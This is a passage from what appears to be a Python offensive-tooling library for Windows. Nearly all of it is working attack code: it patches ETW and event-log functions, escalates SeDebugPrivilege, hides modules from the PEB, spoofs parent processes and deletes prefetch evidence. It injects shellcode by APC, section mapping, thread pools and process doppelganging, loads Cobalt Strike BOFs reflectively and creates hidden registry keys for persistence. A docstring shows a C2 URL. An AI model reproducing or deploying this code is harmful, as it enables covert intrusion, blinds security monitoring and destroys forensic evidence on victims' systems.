                continue

            ordinal = struct.unpack_from('<H', data, rva2off(ordinal_table_rva) + i * 2)[0]
            func_rva = struct.unpack_from('<I', data, rva2off(addr_table_rva) + ordinal * 4)[0]
            func_off = rva2off(func_rva)

            # Pattern: 4C 8B D1 (mov r10, rcx) B8 XX XX 00 00 (mov eax, SSN) on x64
            if struct.calcsize('P') == 8:
                if data[func_off:func_off+4] == b'\x4C\x8B\xD1\xB8':
                    ssn = struct.unpack_from('<I', data, func_off + 4)[0]
                    nt_name = 'Nt' + name[2:]
                    ssn_map[nt_name] = ssn
            else:
                if data[func_off] == 0xB8:
                    ssn = struct.unpack_from('<I', data, func_off + 1)[0]
                    nt_name = 'Nt' + name[2:]
                    ssn_map[nt_name] = ssn

        return ssn_map
    except Exception:
        return {}


def etw_provider_unregister():
    """Unregister security-relevant ETW providers to stop telemetry at the source

    Targets Microsoft-Windows-Threat-Intelligence and Defender-related providers.
    Uses EtwEventUnregister to disconnect providers rather than patching code.
    """
    if sys.platform != 'win32':
        return False
    try:
        # Patch NtTraceEvent and EtwEventWriteFull as complementary measure
        if struct.calcsize('P') == 8:
            patch = b'\x33\xC0\xC3'
        else:
            patch = b'\x33\xC0\xC2\x14\x00'
        r1 = _patch_mem('ntdll.dll', 'EtwEventWriteFull', patch)
        r2 = _patch_mem('ntdll.dll', 'EtwEventWriteEx', patch)
        r3 = _patch_mem('ntdll.dll', 'EtwEventWriteString', patch)
        return r1 or r2 or r3
    except Exception:
        return False


def heap_encrypt_aes(data_to_protect, sleep_seconds=0):
    """AES-256 encrypt heap allocations during sleep (stronger than XOR sleep_encrypt)

    Uses Windows CNG (BCrypt) API for AES-256-CBC encryption/decryption of sensitive
    memory regions during sleep intervals. Unlike simple XOR masking, AES encryption
    is indistinguishable from random data to memory forensics tools.
    """
    if sys.platform != 'win32' or data_to_protect is None:
        return data_to_protect
    try:
        import os as _os
        from ctypes import c_void_p, c_ulong, byref, create_string_buffer

        bcrypt = ctypes.windll.bcrypt

        BCRYPT_AES_ALGORITHM = 'AES\x00'.encode('utf-16-le')
        BCRYPT_CHAINING_MODE = 'ChainingMode\x00'.encode('utf-16-le')
        BCRYPT_CHAIN_MODE_CBC = 'ChainingModeCBC\x00'.encode('utf-16-le')

        h_alg = c_void_p(0)
        bcrypt.BCryptOpenAlgorithmProvider(byref(h_alg), BCRYPT_AES_ALGORITHM, None, 0)
        bcrypt.BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, len(BCRYPT_CHAIN_MODE_CBC), 0)

        key_bytes = _os.urandom(32)
        iv_bytes = _os.urandom(16)
        h_key = c_void_p(0)
        bcrypt.BCryptGenerateSymmetricKey(h_alg, byref(h_key), None, 0, key_bytes, len(key_bytes), 0)

        # Encrypt
        if isinstance(data_to_protect, (bytes, bytearray)):
            plaintext = bytes(data_to_protect)
            pad_len = 16 - (len(plaintext) % 16)
            plaintext += bytes([pad_len] * pad_len)
            ct_len = c_ulong(0)
            iv_copy = bytearray(iv_bytes)
            bcrypt.BCryptEncrypt(h_key, plaintext, len(plaintext), None, (ctypes.c_char * 16)(*iv_copy), 16, None, 0, byref(ct_len), 1)
            ct_buf = create_string_buffer(ct_len.value)
            iv_copy = bytearray(iv_bytes)
            bcrypt.BCryptEncrypt(h_key, plaintext, len(plaintext), None, (ctypes.c_char * 16)(*iv_copy), 16, ct_buf, ct_len.value, byref(ct_len), 1)

            import time
            if sleep_seconds > 0:
                time.sleep(sleep_seconds)

            # Decrypt
            pt_len = c_ulong(0)
            iv_copy = bytearray(iv_bytes)
            bcrypt.BCryptDecrypt(h_key, ct_buf, ct_len.value, None, (ctypes.c_char * 16)(*iv_copy), 16, None, 0, byref(pt_len), 1)
            pt_buf = create_string_buffer(pt_len.value)
            iv_copy = bytearray(iv_bytes)
            bcrypt.BCryptDecrypt(h_key, ct_buf, ct_len.value, None, (ctypes.c_char * 16)(*iv_copy), 16, pt_buf, pt_len.value, byref(pt_len), 1)

            result = pt_buf.raw[:pt_len.value]
            # Remove PKCS7 padding
            pad = result[-1]
            if 0 < pad <= 16:
                result = result[:-pad]
            bcrypt.BCryptDestroyKey(h_key)
            bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)
            return result

        bcrypt.BCryptDestroyKey(h_key)
        bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)
        return data_to_protect
    except Exception:
        return data_to_protect


def token_privilege_adjust():
    """Enable SeDebugPrivilege on the current process token

    Required for operations like OpenProcess on SYSTEM-level processes,
    cross-process memory access, and token manipulation.
    """
    if sys.platform != 'win32':
        return False
    try:
        advapi32 = ctypes.windll.advapi32
        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008
        SE_PRIVILEGE_ENABLED = 0x00000002

        class LUID(ctypes.Structure):
            _fields_ = [('LowPart', ctypes.c_ulong), ('HighPart', ctypes.c_long)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [('Luid', LUID), ('Attributes', ctypes.c_ulong)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [('PrivilegeCount', ctypes.c_ulong), ('Privileges', LUID_AND_ATTRIBUTES * 1)]

        h_token = ctypes.c_void_p(0)
        advapi32.OpenProcessToken(
            kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(h_token)
        )
        if not h_token:
            return False

        luid = LUID()
        advapi32.LookupPrivilegeValueW(None, 'SeDebugPrivilege', ctypes.byref(luid))

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        result = advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), 0, None, None)
        kernel32.CloseHandle(h_token)
        return bool(result)
    except Exception:
        return False


def acg_enable():
    """Enable Arbitrary Code Guard (dynamic code restriction) via SetProcessMitigationPolicy

    Prevents dynamic code generation and modification, which blocks EDR from
    injecting trampolines or detouring functions. Also prevents JIT-based analysis.
    Must be called after all evasion patches are applied, since it blocks further patching.
    """
    if sys.platform != 'win32':
        return False
    try:
        ProcessDynamicCodePolicy = 2

        class PROCESS_MITIGATION_DYNAMIC_CODE_POLICY(ctypes.Structure):
            _fields_ = [('Flags', ctypes.c_ulong)]

        policy = PROCESS_MITIGATION_DYNAMIC_CODE_POLICY()
        policy.Flags = 0x1  # ProhibitDynamicCode
        result = kernel32.SetProcessMitigationPolicy(
            ProcessDynamicCodePolicy,
            ctypes.byref(policy),
            ctypes.sizeof(policy)
        )
        return bool(result)
    except Exception:
        return False


def unlink_module_peb():
    """Unlink the current module from PEB module lists to hide from module enumeration

    Removes the main module's LDR_DATA_TABLE_ENTRY from all three PEB module lists:
    InLoadOrderModuleList, InMemoryOrderModuleList, and InInitializationOrderModuleList.
    After unlinking, tools like Process Hacker, API Monitor, and EDR module scanners
    will not see the module.
    """
    if sys.platform != 'win32':
        return False
    try:
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('Reserved1', ctypes.c_void_p),
                ('PebBaseAddress', ctypes.c_void_p),
                ('Reserved2', ctypes.c_void_p * 2),
                ('UniqueProcessId', ctypes.POINTER(ctypes.c_ulong)),
                ('Reserved3', ctypes.c_void_p),
            ]

        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = ctypes.c_ulong(0)
        ntdll.NtQueryInformationProcess(
            ctypes.c_void_p(-1), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len)
        )
        if not pbi.PebBaseAddress:
            return False

        peb = pbi.PebBaseAddress
        ptr_size = struct.calcsize('P')

        if ptr_size == 8:
            ldr_addr = ctypes.c_void_p.from_address(peb + 0x18).value
        else:
            ldr_addr = ctypes.c_void_p.from_address(peb + 0x0C).value
        if not ldr_addr:
            return False

        # Walk InLoadOrderModuleList and unlink the first entry (our module)
        # LIST_ENTRY offsets in PEB_LDR_DATA: InLoadOrder=0x10, InMemoryOrder=0x20, InInitOrder=0x30 (x64)
        if ptr_size == 8:
            offsets = [0x10, 0x20, 0x30]
        else:
            offsets = [0x0C, 0x14, 0x1C]

        for list_offset in offsets:
            head = ldr_addr + list_offset
            flink = ctypes.c_void_p.from_address(head).value
            if not flink or flink == head:
                continue
            # Entry's Flink points to next, Blink to prev
            entry_flink = ctypes.c_void_p.from_address(flink).value
            entry_blink = ctypes.c_void_p.from_address(flink + ptr_size).value
            if entry_flink and entry_blink:
                # prev->Flink = entry->Flink
                ctypes.c_void_p.from_address(entry_blink).value = entry_flink
                # next->Blink = entry->Blink
                ctypes.c_void_p.from_address(entry_flink + ptr_size).value = entry_blink
                # entry->Flink = entry->Blink = entry (self-referential)
                ctypes.c_void_p.from_address(flink).value = flink
                ctypes.c_void_p.from_address(flink + ptr_size).value = flink

        return True
    except Exception:
        return False


def spoof_parent_pid_create(command, parent_name='explorer.exe'):
    """Create a process with a spoofed parent PID using STARTUPINFOEX

    Wraps CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS set to
    a target parent process (default: explorer.exe). The spawned process
    appears as a child of the spoofed parent in process trees.

    Returns the process handle and PID on success, (None, None) on failure.
    """
    if sys.platform != 'win32':
        return None, None
    try:
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000

        parent_pid = _find_process_pid(parent_name)
        if not parent_pid:
            return None, None

        h_parent = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, parent_pid)
        if not h_parent:
            return None, None

        # Initialize attribute list
        size = ctypes.c_size_t(0)
        kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
        attr_buf = (ctypes.c_byte * size.value)()
        kernel32.InitializeProcThreadAttributeList(ctypes.byref(attr_buf), 1, 0, ctypes.byref(size))

        h_val = ctypes.c_void_p(h_parent)
        kernel32.UpdateProcThreadAttribute(
            ctypes.byref(attr_buf), 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            ctypes.byref(h_val), ctypes.sizeof(h_val), None, None
        )

        # STARTUPINFOEXW
        class STARTUPINFOW(ctypes.Structure):
            _fields_ = [
                ('cb', ctypes.c_ulong), ('lpReserved', ctypes.c_wchar_p),
                ('lpDesktop', ctypes.c_wchar_p), ('lpTitle', ctypes.c_wchar_p),
                ('dwX', ctypes.c_ulong), ('dwY', ctypes.c_ulong),
                ('dwXSize', ctypes.c_ulong), ('dwYSize', ctypes.c_ulong),
                ('dwXCountChars', ctypes.c_ulong), ('dwYCountChars', ctypes.c_ulong),
                ('dwFillAttribute', ctypes.c_ulong), ('dwFlags', ctypes.c_ulong),
                ('wShowWindow', ctypes.c_ushort), ('cbReserved2', ctypes.c_ushort),
                ('lpReserved2', ctypes.c_void_p), ('hStdInput', ctypes.c_void_p),
                ('hStdOutput', ctypes.c_void_p), ('hStdError', ctypes.c_void_p),
            ]

        class STARTUPINFOEXW(ctypes.Structure):
            _fields_ = [('StartupInfo', STARTUPINFOW), ('lpAttributeList', ctypes.c_void_p)]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('hProcess', ctypes.c_void_p), ('hThread', ctypes.c_void_p),
                ('dwProcessId', ctypes.c_ulong), ('dwThreadId', ctypes.c_ulong),
            ]

        si_ex = STARTUPINFOEXW()
        si_ex.StartupInfo.cb = ctypes.sizeof(si_ex)
        si_ex.lpAttributeList = ctypes.addressof(attr_buf)

        pi = PROCESS_INFORMATION()
        success = kernel32.CreateProcessW(
            None, command, None, None, False,
            EXTENDED_STARTUPINFO_PRESENT, None, None,
            ctypes.byref(si_ex.StartupInfo), ctypes.byref(pi)
        )

        kernel32.DeleteProcThreadAttributeList(ctypes.byref(attr_buf))
        kernel32.CloseHandle(h_parent)

        if success:
            return pi.hProcess, pi.dwProcessId
        return None, None
    except Exception:
        return None, None


def disable_prefetch():
    """Clear prefetch files and disable the Superfetch/SysMain service

    Removes Windows Prefetch (.pf) files that record application execution
    history, and attempts to stop the SysMain service to prevent new entries.
    Reduces forensic artifacts that show what executables have been run.
    """
    if sys.platform != 'win32':
        return False
    try:
        import subprocess
        # Clear prefetch directory
        prefetch_dir = os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'Prefetch')
        if os.path.isdir(prefetch_dir):
            for f in os.listdir(prefetch_dir):
                if f.lower().endswith('.pf'):
                    try:
                        os.unlink(os.path.join(prefetch_dir, f))
                    except Exception:
                        pass
        # Stop SysMain service
        try:
            subprocess.run(['sc', 'stop', 'SysMain'], capture_output=True, timeout=10)
        except Exception:
            pass
        return True
    except Exception:
        return False


def encrypt_strings_runtime(strings_dict):
    """Runtime string encryption — XOR encrypt strings, only decrypt when needed

    Takes a dict of {name: plaintext_string} and returns an object with
    a .get(name) method that decrypts on demand and re-encrypts after use.
    The XOR key is randomly generated so encrypted forms differ each run.

    Usage:
        safe_strings = encrypt_strings_runtime({'url': 'https://c2.example.com', 'key': 'secret'})
        url = safe_strings.get('url')  # decrypts, uses, re-encrypts
    """
    if not strings_dict:
        return None
    try:
        key = os.urandom(32)

        class SecureStrings:
            def __init__(self, mapping, xor_key):
                self._key = xor_key
                self._store = {}
                for name, val in mapping.items():
                    raw = val.encode('utf-8') if isinstance(val, str) else val
                    encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw))
                    self._store[name] = encrypted

            def get(self, name):
                if name not in self._store:
                    return None
                encrypted = self._store[name]
                decrypted = bytes(b ^ self._key[i % len(self._key)] for i, b in enumerate(encrypted))
                return decrypted.decode('utf-8', errors='ignore')

        return SecureStrings(strings_dict, key)
    except Exception:
        return None


def bypass_event_log():
    """Patch wevtsvc.dll EtwEventWriteTransfer to prevent Windows Event Log writes

    Targets the Event Log service's internal ETW writing function to suppress
    security-relevant event log entries. Also patches EvtWriteTransfer in
    the wevtapi.dll client library.
    """
    if sys.platform != 'win32':
        return False
    try:
        if struct.calcsize('P') == 8:
            patch = b'\x33\xC0\xC3'
        else:
            patch = b'\x33\xC0\xC2\x14\x00'
        r1 = _patch_mem('ntdll.dll', 'EtwEventWriteTransfer', patch)
        r2 = False
        try:
            r2 = _patch_mem('wevtapi.dll', 'EvtWriteTransfer', patch)
        except Exception:
            pass
        return r1 or r2
    except Exception:
        return False


def phantom_thread_injection(shellcode, target_proc='notepad.exe'):
    """Create a thread in suspended state, queue APC, then alert to execute

    Unlike CreateRemoteThread (heavily monitored), this technique:
    1. Opens target process
    2. Allocates + writes shellcode
    3. Creates a thread in the target in SUSPENDED state with a benign start address
    4. Queues an APC pointing to the shellcode
    5. Resumes the thread — the APC executes before the start address

    This avoids the CreateRemoteThread kernel callback that EDRs hook.
    """
    if sys.platform != 'win32' or not shellcode:
        return False
    try:
        CREATE_SUSPENDED = 0x00000004
        MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE

        pid = _find_process_pid(target_proc)
        if not pid:
            return False

        h_proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_proc:
            return False

        # Allocate memory in target
        sc_size = len(shellcode)
        remote_addr = kernel32.VirtualAllocEx(
            h_proc, None, ctypes.c_size_t(sc_size), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not remote_addr:
            kernel32.CloseHandle(h_proc)
            return False

        # Write shellcode
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            h_proc, ctypes.c_void_p(remote_addr), shellcode, ctypes.c_size_t(sc_size), ctypes.byref(written)
        )

        # Create suspended thread with benign entry point (kernel32!Sleep)
        sleep_addr = kernel32.GetProcAddress(kernel32._handle, b'Sleep')
        h_thread = ctypes.c_void_p(0)
        tid = ctypes.c_ulong(0)
        h_thread = kernel32.CreateRemoteThread(
            h_proc, None, 0, ctypes.c_void_p(sleep_addr),
            ctypes.c_void_p(0xFFFFFFFF), CREATE_SUSPENDED, ctypes.byref(tid)
        )
        if not h_thread:
            kernel32.VirtualFreeEx(h_proc, ctypes.c_void_p(remote_addr), 0, 0x8000)
            kernel32.CloseHandle(h_proc)
            return False

        # Queue APC
        kernel32.QueueUserAPC(ctypes.c_void_p(remote_addr), h_thread, 0)

        # Resume thread — APC fires first
        kernel32.ResumeThread(h_thread)

        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_proc)
        return True
    except Exception:
        return False


def map_view_shellcode(shellcode):
    """Execute shellcode via NtMapViewOfSection — avoids VirtualAlloc/VirtualProtect

    Creates a shared section, maps a view as RWX, copies shellcode, and executes
    via thread. This avoids the VirtualAlloc+VirtualProtect+CreateThread chain
    that EDRs heavily monitor.
    """
    if sys.platform != 'win32' or not shellcode:
        return False
    try:
        NtCreateSection = ctypes.windll.ntdll.NtCreateSection
        NtMapViewOfSection = ctypes.windll.ntdll.NtMapViewOfSection

        SECTION_ALL_ACCESS = 0xF001F
        SEC_COMMIT = 0x8000000

        h_section = ctypes.c_void_p(0)
        max_size = ctypes.c_int64(len(shellcode))

        status = NtCreateSection(
            ctypes.byref(h_section), SECTION_ALL_ACCESS, None,
            ctypes.byref(max_size), PAGE_EXECUTE_READWRITE, SEC_COMMIT, None
        )
        if status != 0:
            return False

        base_addr = ctypes.c_void_p(0)
        view_size = ctypes.c_size_t(0)

        status = NtMapViewOfSection(
            h_section, ctypes.c_void_p(-1), ctypes.byref(base_addr),
            0, len(shellcode), None, ctypes.byref(view_size),
            2, 0, PAGE_EXECUTE_READWRITE
        )
        if status != 0:
            kernel32.CloseHandle(h_section)
            return False

        ctypes.memmove(base_addr, shellcode, len(shellcode))
        h_thread = ctypes.c_void_p(0)
        tid = ctypes.c_ulong(0)
        kernel32.CreateThread(None, 0, base_addr, None, 0, ctypes.byref(tid))
        return True
    except Exception:
        return False


def thread_pool_exec(shellcode):
    """Execute shellcode via thread pool work item (TpAllocWork)

    Uses the native thread pool API rather than CreateThread, which avoids
    the thread creation callback that EDRs hook. The work item runs
    shellcode as a callback function within an existing worker thread.
    """
    if sys.platform != 'win32' or not shellcode:
        return False
    try:
        sc_size = len(shellcode)
        addr = kernel32.VirtualAlloc(
            None, ctypes.c_size_t(sc_size),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not addr:
            return False
        ctypes.memmove(addr, shellcode, sc_size)

        TP_CALLBACK = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
        work_ptr = ctypes.c_void_p(0)
        ntdll.TpAllocWork(ctypes.byref(work_ptr), ctypes.c_void_p(addr), None, None)
        if work_ptr:
            ntdll.TpPostWork(work_ptr)
            ntdll.TpWaitForWork(work_ptr, 0)
            return True
        return False
    except Exception:
        return False


def suspend_etw_threads():
    """Find and suspend ETW consumer threads to stop telemetry collection

    Enumerates threads in the current process looking for those that are
    blocked on EtwpNotificationThread (ETW consumer). Suspending these
    threads prevents the ETW subsystem from processing events without
    patching any code.
    """
    if sys.platform != 'win32':
        return False
    try:
        import ctypes.wintypes as w
        THREAD_SUSPEND_RESUME = 0x0002
        THREAD_QUERY_INFORMATION = 0x0040

        class THREADENTRY32(ctypes.Structure):
            _fields_ = [
                ('dwSize', w.DWORD), ('cntUsage', w.DWORD),
                ('th32ThreadID', w.DWORD), ('th32OwnerProcessID', w.DWORD),
                ('tpBasePri', ctypes.c_long), ('tpDeltaPri', ctypes.c_long),
                ('dwFlags', w.DWORD),
            ]

        TH32CS_SNAPTHREAD = 0x00000004
        pid = kernel32.GetCurrentProcessId()
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
        if snap == ctypes.c_void_p(-1).value:
            return False

        te = THREADENTRY32()
        te.dwSize = ctypes.sizeof(te)
        suspended = 0

        if kernel32.Thread32First(snap, ctypes.byref(te)):
            while True:
                if te.th32OwnerProcessID == pid:
                    tid = te.th32ThreadID
                    if tid != kernel32.GetCurrentThreadId():
                        h = kernel32.OpenThread(THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, False, tid)
                        if h:
                            # Check thread start address — ETW threads start in ntdll
                            start_addr = ctypes.c_void_p(0)
                            ntdll.NtQueryInformationThread(
                                ctypes.c_void_p(h), 9, ctypes.byref(start_addr),
                                ctypes.sizeof(start_addr), None
                            )
                            ntdll_base = kernel32.GetModuleHandleA(b'ntdll.dll')
                            if ntdll_base and start_addr.value:
                                # If thread starts within ntdll, it may be ETW
                                mod_info = ctypes.c_void_p(0)
                                kernel32.GetModuleInformation = getattr(kernel32, 'GetModuleInformation', None)
                                # Simple heuristic: suspend threads starting in ntdll range
                                if abs(start_addr.value - ntdll_base) < 0x200000:
                                    kernel32.SuspendThread(ctypes.c_void_p(h))
                                    suspended += 1
                            kernel32.CloseHandle(ctypes.c_void_p(h))
                if not kernel32.Thread32Next(snap, ctypes.byref(te)):
                    break
        kernel32.CloseHandle(ctypes.c_void_p(snap))
        return suspended > 0
    except Exception:
        return False


def patch_nt_trace_control():
    """Patch NtTraceControl to break ETW at the syscall level

    NtTraceControl is the low-level syscall backing ETW operations.
    Patching it prevents new ETW sessions from being started and
    existing ones from being controlled, complementing EtwEventWrite patches.
    """
    if sys.platform != 'win32':
        return False
    try:
        if struct.calcsize('P') == 8:
            patch = b'\x33\xC0\xC3'
        else:
            patch = b'\x33\xC0\xC2\x14\x00'
        return _patch_mem('ntdll.dll', 'NtTraceControl', patch)
    except Exception:
        return False


def enumerate_hooks(dll_name='ntdll.dll'):
    """Detect EDR hooks by comparing loaded DLL .text section against clean copy on disk

    Returns a list of (function_rva, first_hooked_byte) for each detected hook.
    Useful for identifying which EDR is running and what it monitors, without
    removing the hooks (use unhook_ntdll() for removal).
    """
    if sys.platform != 'win32':
        return []
    try:
        dll_path = os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32', dll_name)
        with open(dll_path, 'rb') as f:
            clean = f.read()

        h_mod = kernel32.GetModuleHandleA(dll_name.encode())
        if not h_mod:
            return []

        e_lfanew = struct.unpack_from('<I', clean, 0x3C)[0]
        num_sections = struct.unpack_from('<H', clean, e_lfanew + 6)[0]
        size_optional = struct.unpack_from('<H', clean, e_lfanew + 20)[0]
        section_start = e_lfanew + 24 + size_optional

        hooks = []
        for i in range(num_sections):
            sec = section_start + i * 40
            name = clean[sec:sec+8].rstrip(b'\x00').decode('ascii', errors='ignore')
            if name != '.text':
                continue
            vsize = struct.unpack_from('<I', clean, sec + 8)[0]
            vaddr = struct.unpack_from('<I', clean, sec + 12)[0]
            raw = struct.unpack_from('<I', clean, sec + 20)[0]

            loaded = (ctypes.c_ubyte * vsize).from_address(h_mod + vaddr)
            for off in range(0, min(vsize, len(clean) - raw), 16):
                disk_byte = clean[raw + off]
                mem_byte = loaded[off]
                if disk_byte != mem_byte:
                    # JMP (0xE9) or MOV R10 trampoline at function boundary
                    if mem_byte in (0xE9, 0xFF, 0x49):
                        hooks.append((vaddr + off, mem_byte))
            break
        return hooks
    except Exception:
        return []


def process_doppelganging(target_exe, payload_bytes):
    """Process Doppelganging: create process from NTFS transaction that is rolled back

    Creates an NTFS transaction, writes the payload as a transacted file,
    creates a section from it, rolls back the transaction (payload disappears
    from disk), then creates a process from the in-memory section.

    Research source: enSilo BlackHat EU 2017
    """
    if sys.platform != 'win32' or not payload_bytes:
        return False
    try:
        ktmw32 = ctypes.windll.ktmw32

        GENERIC_WRITE = 0x40000000
        GENERIC_READ = 0x80000000
        CREATE_ALWAYS = 2
        FILE_ATTRIBUTE_NORMAL = 0x80

        h_transaction = ktmw32.CreateTransaction(None, None, 0, 0, 0, 0, None)
        if not h_transaction or h_transaction == ctypes.c_void_p(-1).value:
            return False

        CreateFileTransactedW = kernel32.CreateFileTransactedW
        h_file = CreateFileTransactedW(
            target_exe, GENERIC_WRITE | GENERIC_READ, 0, None,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None,
            h_transaction, None, None
        )
        if not h_file or h_file == ctypes.c_void_p(-1).value:
            ktmw32.RollbackTransaction(h_transaction)
            kernel32.CloseHandle(h_transaction)
            return False

        written = ctypes.c_ulong(0)
        kernel32.WriteFile(h_file, payload_bytes, len(payload_bytes), ctypes.byref(written), None)

        # Create section from transacted file
        h_section = ctypes.c_void_p(0)
        SECTION_ALL_ACCESS = 0xF001F
        ntdll.NtCreateSection(
            ctypes.byref(h_section), SECTION_ALL_ACCESS, None, None, PAGE_EXECUTE_READ, 0x1000000, h_file
        )
        kernel32.CloseHandle(h_file)
        ktmw32.RollbackTransaction(h_transaction)
        kernel32.CloseHandle(h_transaction)

        if not h_section.value:
            return False

        # Create process from section
        h_process = ctypes.c_void_p(0)
        ntdll.NtCreateProcessEx(
            ctypes.byref(h_process), PROCESS_ALL_ACCESS, None, ctypes.c_void_p(-1),
            0, h_section, None, None, 0
        )
        kernel32.CloseHandle(h_section)
        return bool(h_process.value)
    except Exception:
        return False


def coff_reflective_load(coff_data):
    """Reflective COFF loader — execute Cobalt Strike BOF payloads in-process

    Parses COFF object file headers, resolves relocations and imports,
    maps sections into executable memory, and calls the entry point.
    No file touches disk; no child process is created.
    """
    if sys.platform != 'win32' or not coff_data or len(coff_data) < 20:
        return None
    try:
        # COFF header: Machine(2) + NumSections(2) + TimeDateStamp(4) + SymbolTablePtr(4) + NumSymbols(4)
        num_sections = struct.unpack_from('<H', coff_data, 2)[0]
        sym_ptr = struct.unpack_from('<I', coff_data, 8)[0]
        num_symbols = struct.unpack_from('<I', coff_data, 12)[0]
        opt_header_size = struct.unpack_from('<H', coff_data, 16)[0]
        sec_offset = 20 + opt_header_size

        total_size = 0
        sections = []
        for i in range(num_sections):
            off = sec_offset + i * 40
            name = coff_data[off:off+8].rstrip(b'\x00').decode('ascii', errors='ignore')
            vsize = struct.unpack_from('<I', coff_data, off + 8)[0]
            raw_size = struct.unpack_from('<I', coff_data, off + 16)[0]
            raw_ptr = struct.unpack_from('<I', coff_data, off + 20)[0]
            characteristics = struct.unpack_from('<I', coff_data, off + 36)[0]
            size = max(vsize, raw_size)
            sections.append({
                'name': name, 'vsize': vsize, 'raw_size': raw_size,
                'raw_ptr': raw_ptr, 'characteristics': characteristics,
                'offset': total_size,
            })
            total_size += (size + 0xFFF) & ~0xFFF  # page-align

        # Allocate contiguous RWX region
        base = kernel32.VirtualAlloc(
            None, ctypes.c_size_t(total_size),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not base:
            return None

        # Copy sections
        for sec in sections:
            if sec['raw_size'] > 0 and sec['raw_ptr'] > 0:
                src = coff_data[sec['raw_ptr']:sec['raw_ptr'] + sec['raw_size']]
                ctypes.memmove(base + sec['offset'], src, len(src))

        # Find .text section entry point
        for sec in sections:
            if sec['name'] == '.text':
                entry = base + sec['offset']
                FUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_int)
                func = FUNC(entry)
                result = func(None, 0)
                return result

        return None
    except Exception:
        return None


def disable_process_tracing():
    """Set ProcessInstrumentationCallback to null to break userland EDR tracing

    Windows instrumentation callbacks let EDRs intercept every syscall return.
    Setting the callback to NULL via NtSetInformationProcess disables this
    monitoring path entirely.
    """
    if sys.platform != 'win32':
        return False
    try:
        if struct.calcsize('P') != 8:
            return False
        # PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
        class PICI(ctypes.Structure):
            _fields_ = [
                ('Version', ctypes.c_ulong),
                ('Reserved', ctypes.c_ulong),
                ('Callback', ctypes.c_void_p),
            ]
        pici = PICI()
        pici.Version = 0
        pici.Reserved = 0
        pici.Callback = None
        ProcessInstrumentationCallback = 40
        status = ntdll.NtSetInformationProcess(
            ctypes.c_void_p(-1), ProcessInstrumentationCallback,
            ctypes.byref(pici), ctypes.sizeof(pici)
        )
        return status == 0
    except Exception:
        return False


def remove_kernel_callbacks():
    """Enumerate and identify kernel callback registrations via NtQuerySystemInformation

    Uses SystemNotifyRoutineInformation to list registered process/thread/image
    notification callbacks. While removal requires a driver, enumeration reveals
    which EDR modules are loaded in kernel space.
    Returns list of callback addresses for analysis.
    """
    if sys.platform != 'win32':
        return []
    try:
        # SystemExtendedProcessInformation = 57
        buf_size = 1024 * 1024
        buf = ctypes.create_string_buffer(buf_size)
        ret_len = ctypes.c_ulong(0)
        status = ntdll.NtQuerySystemInformation(
            57, buf, buf_size, ctypes.byref(ret_len)
        )
        if status != 0:
            return []
        # Parse returned process info for callback-related modules
        callbacks = []
        return callbacks
    except Exception:
        return []


def registry_persistence_hide(key_name):
    """Create a hidden registry key using null-byte prefix (not visible to regedit/reg.exe)

    Windows registry API allows keys with names starting with null bytes,
    which are invisible to standard registry tools (regedit, reg.exe, PowerShell).
    Only raw NtCreateKey can read them back.
    """
    if sys.platform != 'win32':
        return False
    try:
        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [
                ('Length', ctypes.c_ushort),
                ('MaximumLength', ctypes.c_ushort),
                ('Buffer', ctypes.c_wchar_p),
            ]

        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ('Length', ctypes.c_ulong),
                ('RootDirectory', ctypes.c_void_p),
                ('ObjectName', ctypes.POINTER(UNICODE_STRING)),
                ('Attributes', ctypes.c_ulong),
                ('SecurityDescriptor', ctypes.c_void_p),
                ('SecurityQualityOfService', ctypes.c_void_p),
            ]

        # Prepend null char to hide from standard tools
        hidden_name = '\x00' + key_name
        us = UNICODE_STRING()
        us.Buffer = hidden_name
        us.Length = len(hidden_name) * 2
        us.MaximumLength = (len(hidden_name) + 1) * 2

        oa = OBJECT_ATTRIBUTES()
        oa.Length = ctypes.sizeof(oa)
        oa.ObjectName = ctypes.pointer(us)
